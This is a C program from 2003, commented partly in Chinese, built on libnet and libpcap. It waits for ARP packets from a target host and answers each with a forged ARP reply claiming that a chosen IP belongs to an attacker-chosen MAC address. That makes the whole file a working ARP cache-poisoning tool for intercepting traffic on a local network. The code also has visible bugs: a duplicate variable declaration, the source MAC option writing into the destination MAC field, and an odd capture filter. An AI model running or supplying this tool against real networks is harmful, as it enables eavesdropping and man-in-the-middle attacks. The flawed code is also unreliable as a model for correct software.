/* tell destination host with ip 'dstip' that the host with 
  * request ip 'srcip' is with mac address srcmac
 * author: white cpf  2003.5.15.
 * compile: gcc arp.c -lnet -lpcap -o arp
 */
#include "/usr/include/libnet.h"
#include <pcap.h>
void usage(char * exename){
    printf(" tell dstip with dstmac that srcip is at srcmac. \n");
    printf(" usage: %s -d dstip -s srcip -D dstmac -S srcmac \n",exename);
    return ;
}
//程序输入：来自命令行参数
u_char ip_src[4],ip_dst[4];
u_char enet_src[6],enet_dst[6];
extern int mac_strtochar6(u_char * enet,char * macstr);
//将字符串格式的MAC地址转换为6字节类型r
int get_cmdline(int argc,char *argv[]);//命令行参数处理函数
int main(int argc, char *argv[]){
    libnet_t *l;
    libnet_ptag_t t;
    u_char *packet;
    u_long packet_s;
    char device[5]="eth0";
    char errbuf[LIBNET_ERRBUF_SIZE];
    char filter_str[100]="";
    struct bpf_program fp;      /* hold compiled program     */
    char *dev;
    pcap_t* descr;
    struct pcap_pkthdr hdr;     /* pcap.h    */
    u_char * packet;
    bpf_u_int32 maskp;          /* subnet mask               */
    bpf_u_int32 netp;           /* ip                        */
    int promisc=0;               /* set to promisc mode?        */
    int pcap_time_out=5;
    int c, ret;
    u_long i;
    if(get_cmdline(argc,argv)<=0){
		usage(argv[0]);
		exit(0);
    }
    
    dev = pcap_lookupdev(errbuf);//返回可被pcap_open_live()或pcap_lookupnet()函数调用的网络设备名
    if(dev == NULL){ 
            fprintf(stderr,"%s\n",errbuf);
            return -1;
        }
    ret=pcap_lookupnet(dev,&netp,&maskp,errbuf);//获得指定网络设备的网络号和掩码
    if(ret==-1){
            fprintf(stderr,"%s\n",errbuf);
            return -1;
    }
    descr = pcap_open_live(dev,BUFSIZ,promisc,pcap_time_out,errbuf);//打开设备,获得用于捕获网络数据包的数据包捕获描述字
    if(descr == NULL){
        printf("pcap_open_live(): %s\n",errbuf);
        return -1; 
    }
    sprintf(filter_str,"arp and (src net %d.%d.%d.%d)",ip_dst[0],ip_dst[1],ip_dst[2],ip_dst[3]);
    if(pcap_compile(descr,&fp,filter_str,0,netp) == -1){//编译和设置过滤器,netp参数指定本地网络的网络掩码
        printf("Error calling pcap_compile\n"); 
        return -1;
    }
    if(pcap_setfilter(descr,&fp) == -1){ //指定一个过滤程序。
        printf("Error setting filter\n"); 
        return -1;
    }
	while(1){
		printf("wait packet:filter:%s\n",filter_str);
		packet=pcap_next(descr, &hdr);//返回指向下一个数据包的u_char指针
		if(packet == NULL){
			continue;
		}
		l = libnet_init(LIBNET_LINK_ADV,device,errbuf);
			//该函数初始化libnet函数库，返回一个libnet_t类型的描述符，以备随后的构造数据报和发送数据报的函数中使用。
			//injection_type指明了发送数据报使用的接口类型，如数据链路层或者原始套接字等。
			//Device是一个网络设备名称的字符串，在Linux下是"eth0"等。
		if (l == NULL){
			fprintf(stderr, "libnet_init() failed: %s", errbuf);
			exit(EXIT_FAILURE);
		}
		t = libnet_build_arp(
				ARPHRD_ETHER,                           /* hardware addr */
				ETHERTYPE_IP,                           /* protocol addr */
				6,                                      /* hardware addr size */
				4,                                      /* protocol addr size */
				ARPOP_REPLY,                            /* operation type */
				enet_src,                               /* sender hardware addr */
				ip_src,                           /* sender protocol addr */
				enet_dst,                               /* target hardware addr */
				ip_dst,                           /* target protocol addr */
				NULL,                                   /* payload */
				0,                                      /* payload size */
				l,                                      /* libnet handle */
				0);                                     /* libnet id */
		if (t == -1){
			fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
			goto bad;
		}
		t = libnet_autobuild_ethernet(
				enet_dst,                               /* ethernet destination */
				ETHERTYPE_ARP,                          /* protocol type */
				l);                                     /* libnet handle */
		if (t == -1){
			fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
			goto bad;
		}
		c = libnet_adv_cull_packet(l, &packet, &packet_s);
		if (c == -1){
			fprintf(stderr, "libnet_adv_cull_packet: %s\n", libnet_geterror(l));
			goto bad;
		}
		c = libnet_write(l);//数据报的发送,将l中描述的数据报发送的网络上。
		if (c == -1){
			fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
			goto bad;
		}
		continue;
	bad:
		libnet_destroy(l);
		return (EXIT_FAILURE);
	}
    libnet_destroy(l);
    return (EXIT_FAILURE);
}
int get_cmdline(int argc,char *argv[]){
    char c;
    char string[]="d:s:D:S:h";
    while((c = getopt(argc, argv, string)) != EOF){
        if(c=='d')
            *((unsigned int*)ip_dst)=(unsigned int)inet_addr(optarg);
        else if(c== 's')
            *((unsigned int*)ip_src)=(unsigned int)inet_addr(optarg);
        else if(c=='D')
            mac_strtochar6(enet_dst,optarg);
        else if(c=='S')
            mac_strtochar6(enet_dst,optarg);
        else if(c=='h')
            return 0;
        else
            return -1;
    }
    return 1;
}